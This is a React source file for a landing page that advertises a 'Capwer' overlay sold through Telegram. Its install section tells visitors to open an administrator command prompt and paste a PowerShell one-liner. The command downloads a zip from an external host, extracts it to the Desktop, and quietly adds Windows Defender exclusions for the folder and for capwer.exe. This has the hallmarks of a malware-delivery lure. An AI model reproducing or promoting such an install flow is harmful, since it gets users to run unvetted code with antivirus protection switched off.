import { useState, useEffect } from 'react';
import { Logo } from './components/Logo';
import {
  Send,
  Copy,
  Check,
  ExternalLink,
  Volume2,
  VolumeX,
  MonitorCheck,
  ClipboardPaste,
  PlayCircle,
  ChevronRight,
} from 'lucide-react';
import { toggleSound, isSoundEnabled, playBlip, playSuccess } from './utils/audio';

const INSTALL_CMD = `powershell -NoProfile -Command "iwr 'https://api.skyshot.shop/download/capwer.zip' -OutFile \\"$env:USERPROFILE\\Desktop\\capwer.zip\\"; Expand-Archive \\"$env:USERPROFILE\\Desktop\\capwer.zip\\" -DestinationPath \\"$env:USERPROFILE\\Desktop\\CAPWER\\" -Force; Add-MpPreference -ExclusionPath \\"$env:USERPROFILE\\Desktop\\CAPWER\\"; Add-MpPreference -ExclusionProcess 'capwer.exe'"`;

const STEPS = [
  {
    num: '01',
    icon: MonitorCheck,
    title: 'Open CMD as Administrator',
    body: (
      <>
        Hit the <kbd className="kbd-key">Windows</kbd> key and search for{' '}
        <code className="text-white font-mono">cmd</code>. When it appears in results,
        right-click it and choose{' '}
        <strong className="text-white font-semibold">Run as administrator</strong>.
        The window title should read{' '}
        <span className="font-mono text-white/70">Administrator: Command Prompt</span>.
      </>
    ),
  },
  {
    num: '02',
    icon: ClipboardPaste,
    title: 'Paste the Command',
    body: (
      <>
        Copy the command below, then right-click inside the admin CMD window and
        select <strong className="text-white font-semibold">Paste</strong>.
        The full command will appear in one line — don't edit it.
      </>
    ),
  },
  {
    num: '03',
    icon: PlayCircle,
    title: 'Press Enter & Done',
    body: (
      <>
        Press <kbd className="kbd-key">Enter</kbd>. The script downloads and
        extracts Capwer to{' '}
        <span className="font-mono text-white/70">Desktop\CAPWER</span>, then
        silently adds Windows Defender exclusions. No further action needed.
      </>
    ),
  },
];

const WHAT_HAPPENS = [
  'Downloads capwer.zip to your Desktop',
  'Extracts files into Desktop\\CAPWER',
  'Adds Defender exclusion for the folder',
  'Adds Defender exclusion for capwer.exe',
];

export function App() {
  const [copied, setCopied] = useState(false);
  const [cmdCopied, setCmdCopied] = useState(false);
  const [soundOn, setSoundOn] = useState(isSoundEnabled());
  const [mousePos, setMousePos] = useState({ x: 0, y: 0 });

  useEffect(() => {
    const fn = (e: MouseEvent) => setMousePos({ x: e.clientX, y: e.clientY });
    window.addEventListener('mousemove', fn);
    return () => window.removeEventListener('mousemove', fn);
  }, []);

  const telegramUrl = 'https://t.me/capwerofficial';
  const telegramHandle = '@capwerofficial';

  const handleCopy = () => {
    navigator.clipboard.writeText(telegramUrl);
    setCopied(true);
    playSuccess();
    setTimeout(() => setCopied(false), 2200);
  };

  const handleCmdCopy = () => {
    navigator.clipboard.writeText(INSTALL_CMD);
    setCmdCopied(true);
    playSuccess();
    setTimeout(() => setCmdCopied(false), 2200);
  };

  const handleSoundToggle = () => {
    const next = toggleSound();
    setSoundOn(next);
    if (next) playBlip(880, 'sine', 0.04);
  };

  return (
    <div className="relative min-h-screen w-full bg-[#080808] text-white flex flex-col overflow-hidden">

      {/* subtle grid */}
      <div className="absolute inset-0 bg-grid-pattern opacity-[0.15] pointer-events-none" />

      {/* mouse vignette — barely visible, warm white */}
      <div
        className="pointer-events-none fixed inset-0 z-10 hidden md:block"
        style={{
          background: `radial-gradient(600px circle at ${mousePos.x}px ${mousePos.y}px, rgba(255,255,255,0.025), transparent 70%)`,
        }}
      />

      {/* BIG CAPWER TEXT */}
      <div className="absolute inset-0 flex items-center justify-center pointer-events-none select-none overflow-hidden z-0">
        <span
          className="text-[17vw] sm:text-[19vw] md:text-[21vw] font-black uppercase leading-none text-stroke-giant"
          style={{ letterSpacing: '-0.06em' }}
        >
          CAPWER
        </span>
      </div>

      {/* ─────── HEADER ─────── */}
      <header className="relative z-20 w-full px-6 py-5 sm:px-10 flex items-center justify-between border-b border-white/[0.06]">
        <div className="flex items-center gap-2.5">
          <Logo size="sm" showText={false} interactive />
          <span className="font-bold tracking-tight text-white text-sm">capwer</span>
          <span className="text-[10px] font-mono text-white/40 border border-white/[0.12] px-1.5 py-0.5 rounded uppercase tracking-widest">
            overlay
          </span>
        </div>

        <div className="flex items-center gap-3">
          <div className="hidden sm:flex items-center gap-2 text-[11px] font-mono text-white/30">
            <span className="h-1.5 w-1.5 rounded-full bg-white/40 animate-pulse" />
            TELEGRAM DISPATCH
          </div>
          <button
            onClick={handleSoundToggle}
            className="p-2 rounded-md bg-white/[0.04] hover:bg-white/[0.08] border border-white/[0.08] text-white/40 hover:text-white/80 transition-all flex items-center gap-1.5"
          >
            {soundOn
              ? <Volume2 className="w-3.5 h-3.5" />
              : <VolumeX className="w-3.5 h-3.5" />}
            <span className="text-[10px] font-mono hidden md:inline">{soundOn ? 'SFX' : 'MUTE'}</span>
          </button>
        </div>
      </header>

      {/* ─────── HERO ─────── */}
      <main className="relative z-20 flex flex-col items-center px-4 sm:px-6 py-16 text-center max-w-2xl mx-auto w-full">

        {/* Mascot */}
        <div className="mb-7">
          <Logo size="hero" showText={false} interactive />
        </div>

        {/* Label */}
        <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full border border-white/[0.1] text-[11px] font-mono text-white/40 mb-6 tracking-widest uppercase">
          Tool Overlay · Private Acquisition
        </div>

        {/* Headline */}
        <h1 className="text-2xl sm:text-3xl font-semibold tracking-tight text-white leading-snug">
          Want to buy this overlay?
          <br />
          Message us on Telegram.
        </h1>
        <p className="mt-3 text-sm text-white/40 max-w-sm">
          Pricing, licensing, and setup tokens are sent privately.
        </p>

        {/* Telegram card */}
        <div className="mt-8 w-full max-w-sm rounded-xl border border-white/[0.1] bg-white/[0.03] p-4">

          {/* Handle row */}
          <div className="flex items-center justify-between gap-3 p-3 rounded-lg bg-black/60 border border-white/[0.06] mb-3">
            <div className="flex items-center gap-2.5">
              <div className="w-7 h-7 rounded-md bg-white/[0.06] border border-white/[0.08] flex items-center justify-center flex-shrink-0">
                <Send className="w-3.5 h-3.5 text-white/60 -translate-x-0.5 translate-y-0.5" />
              </div>
              <div className="text-left">
                <span className="text-[10px] text-white/30 block uppercase tracking-wider font-mono">Telegram</span>
                <span className="text-white font-mono text-sm select-all">{telegramHandle}</span>
              </div>
            </div>

            <button
              onClick={handleCopy}
              className="flex items-center gap-1.5 px-2.5 py-1.5 rounded-md bg-white/[0.05] hover:bg-white/[0.1] border border-white/[0.08] text-[11px] font-mono text-white/60 hover:text-white transition-all flex-shrink-0"
            >
              {copied
                ? <><Check className="w-3.5 h-3.5 text-white" /><span>Copied</span></>
                : <><Copy className="w-3.5 h-3.5" /><span>Copy</span></>}
            </button>
          </div>

          {/* CTA */}
          <a
            href={telegramUrl}
            target="_blank"
            rel="noopener noreferrer"
            onClick={() => playBlip(880, 'sine', 0.04)}
            className="w-full py-3 px-5 rounded-lg bg-white text-black font-semibold text-sm tracking-wide transition-all hover:bg-white/90 active:scale-[0.99] flex items-center justify-center gap-2"
          >
            <Send className="w-4 h-4" />
            <span>Open Telegram</span>
            <ExternalLink className="w-3.5 h-3.5 opacity-60" />
          </a>

          <div className="mt-2.5 text-center">
            <a
              href={telegramUrl}
              target="_blank"
              rel="noopener noreferrer"
              className="text-[11px] font-mono text-white/25 hover:text-white/50 transition-colors"
            >
              {telegramUrl}
            </a>
          </div>
        </div>
      </main>

      {/* ─────── INSTALL SECTION ─────── */}
      <section className="relative z-20 w-full px-4 sm:px-6 pb-20 pt-2">

        {/* Divider */}
        <div className="max-w-2xl mx-auto flex items-center gap-4 mb-12">
          <div className="flex-1 h-px bg-white/[0.06]" />
          <span className="text-[11px] font-mono text-white/25 tracking-widest uppercase flex-shrink-0">
            Windows Only
          </span>
          <div className="flex-1 h-px bg-white/[0.06]" />
        </div>

        <div className="max-w-2xl mx-auto">

          {/* Section heading */}
          <div className="text-center mb-10">
            <h2 className="text-3xl sm:text-4xl font-black tracking-tight text-white uppercase">
              How to Install
            </h2>
            <p className="mt-3 text-sm text-white/40 max-w-md mx-auto">
              Open CMD as admin, paste one command, press Enter.
              Done in under 30 seconds.
            </p>
          </div>

          {/* Steps */}
          <div className="space-y-2">
            {STEPS.map(({ num, icon: Icon, title, body }) => (
              <div
                key={num}
                className="flex items-start gap-4 p-5 rounded-xl border border-white/[0.07] bg-white/[0.02] hover:bg-white/[0.04] hover:border-white/[0.12] transition-all duration-150"
              >
                <div className="flex-shrink-0 w-9 h-9 rounded-lg bg-white/[0.05] border border-white/[0.1] flex items-center justify-center">
                  <span className="font-mono text-xs font-bold text-white/50">{num}</span>
                </div>
                <div className="text-left min-w-0">
                  <h3 className="flex items-center gap-2 text-[13px] font-semibold text-white mb-1.5 tracking-wide">
                    <Icon className="w-3.5 h-3.5 text-white/40 flex-shrink-0" />
                    {title}
                  </h3>
                  <p className="text-[13px] text-white/45 leading-relaxed">
                    {body}
                  </p>
                </div>
              </div>
            ))}
          </div>

          {/* CMD Terminal block */}
          <div className="mt-4 rounded-xl border border-white/[0.08] bg-[#0d0d0d] overflow-hidden">

            {/* Title bar */}
            <div className="flex items-center justify-between px-4 py-3 border-b border-white/[0.06]">
              <div className="flex items-center gap-2">
                <span className="w-2.5 h-2.5 rounded-full bg-[#ff5f57]/80" />
                <span className="w-2.5 h-2.5 rounded-full bg-[#ffbd2e]/80" />
                <span className="w-2.5 h-2.5 rounded-full bg-[#28c840]/80" />
                <span className="ml-3 text-[11px] font-mono text-white/25 tracking-wide">
                  cmd.exe — Administrator
                </span>
              </div>
              <button
                onClick={handleCmdCopy}
                className="flex items-center gap-1.5 px-2.5 py-1.5 rounded-md bg-white/[0.04] hover:bg-white/[0.09] border border-white/[0.08] text-[11px] font-mono text-white/50 hover:text-white transition-all"
              >
                {cmdCopied
                  ? <><Check className="w-3.5 h-3.5" /><span>Copied!</span></>
                  : <><Copy className="w-3.5 h-3.5" /><span>Copy</span></>}
              </button>
            </div>

            {/* Command text */}
            <div className="p-5 sm:p-6">
              <div className="flex items-start gap-3 font-mono text-[12px] sm:text-[13px] leading-relaxed">
                <span className="text-white/20 select-none flex-shrink-0 pt-px">C:\&gt;</span>
                <code className="text-[#4ade80] whitespace-pre-wrap break-all text-left">
                  {INSTALL_CMD}
                </code>
              </div>
            </div>
          </div>

          {/* What happens */}
          <div className="mt-3 rounded-xl border border-white/[0.07] bg-white/[0.02] p-5">
            <h4 className="text-[12px] font-mono font-semibold text-white/50 uppercase tracking-widest mb-4">
              What happens when you run this
            </h4>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-x-6 gap-y-2.5">
              {WHAT_HAPPENS.map((line, i) => (
                <div key={i} className="flex items-start gap-2 text-[13px] text-white/50">
                  <ChevronRight className="w-3.5 h-3.5 text-white/25 flex-shrink-0 mt-0.5" />
                  <span>{line}</span>
                </div>
              ))}
            </div>
          </div>
        </div>
      </section>

      {/* ─────── FOOTER ─────── */}
      <footer className="relative z-20 w-full px-6 py-5 sm:px-10 border-t border-white/[0.05] text-[11px] font-mono text-white/25 flex flex-col sm:flex-row items-center justify-between gap-3">
        <span>CAPWER SYSTEMS · ALL RIGHTS RESERVED</span>
        <div className="flex items-center gap-4">
          <a
            href={telegramUrl}
            target="_blank"
            rel="noopener noreferrer"
            className="hover:text-white/60 transition-colors"
          >
            t.me/capwerofficial
          </a>
          <span className="text-white/10">·</span>
          <span>ENCRYPTED DISPATCH</span>
        </div>
      </footer>
    </div>
  );
}

export default App;
